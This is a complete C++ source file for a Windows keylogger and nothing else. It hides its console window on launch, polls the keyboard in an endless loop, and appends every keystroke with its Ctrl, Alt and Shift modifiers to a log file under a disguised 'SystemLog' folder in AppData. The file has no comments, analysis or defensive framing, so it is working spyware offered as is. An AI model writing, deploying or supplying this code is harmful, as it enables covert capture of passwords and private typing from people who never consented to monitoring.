#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
using namespace std;
bool keyWasDown[256]={false};
void logKey(const string& key){
    ofstream logFile("C:\\Users\\Hadil\\AppData\\Roaming\\SystemLog\\log.txt", ios::app);
    logFile<<key;
    logFile.close();
}
int main(){
    ShowWindow(GetConsoleWindow(),SW_HIDE);
    while (true) {
        bool ctrl=(GetAsyncKeyState(VK_CONTROL) & 0x8000);
        bool shift=(GetAsyncKeyState(VK_SHIFT) & 0x8000);
        bool alt=(GetAsyncKeyState(VK_MENU) & 0x8000);
        for (int i = 8; i <= 126; i++) {
            bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
            if (isDown && !keyWasDown[i]){
                string keyStr;
                switch (i){
                    case 13: keyStr="[ENTER]"; break;
                    case 9: keyStr="[TAB]"; break;
                    case 8: keyStr="[BACKSPACE]"; break;
                    case 27: keyStr="[ESC]"; break;
                    case 32: keyStr="[SPACE]"; break;
                    default:
                        if (i>=32 && i<=126)
                            keyStr=static_cast<char>(i);
                        else
                            keyStr="[KEY:" + to_string(i) + "]";
                        break;
                }
                string prefix;
                if (ctrl)  prefix+="CTRL + ";
                if (alt)   prefix+="ALT + ";
                if (shift) prefix+="SHIFT + ";
                logKey(prefix+keyStr);
                keyWasDown[i]=true;
            }
            if (!isDown) keyWasDown[i]=false;
        }
        Sleep(1); 
    }
    return 0;
}
